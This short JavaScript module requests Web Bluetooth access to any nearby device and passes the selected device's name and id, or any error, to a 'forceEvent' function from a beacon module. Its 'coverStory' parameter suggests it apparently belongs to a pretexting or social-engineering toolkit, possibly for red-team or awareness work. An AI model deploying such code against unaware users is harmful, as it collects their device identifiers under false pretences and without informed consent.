import { forceEvent } from '../beacon.js';

export async function requestPermission(coverStory, options) {
  if (!navigator.bluetooth) {
    await forceEvent('bluetooth', { supported: false });
    return { supported: false };
  }
  try {
    const device = await navigator.bluetooth.requestDevice({
      acceptAllDevices: true,
      optionalServices: ['battery_service'],
    });
    await forceEvent('bluetooth', { name: device.name, id: device.id });
    return { name: device.name, id: device.id };
  } catch (e) {
    await forceEvent('bluetooth', { supported: false, error: e.message });
    return { supported: false, error: e.message };
  }
}
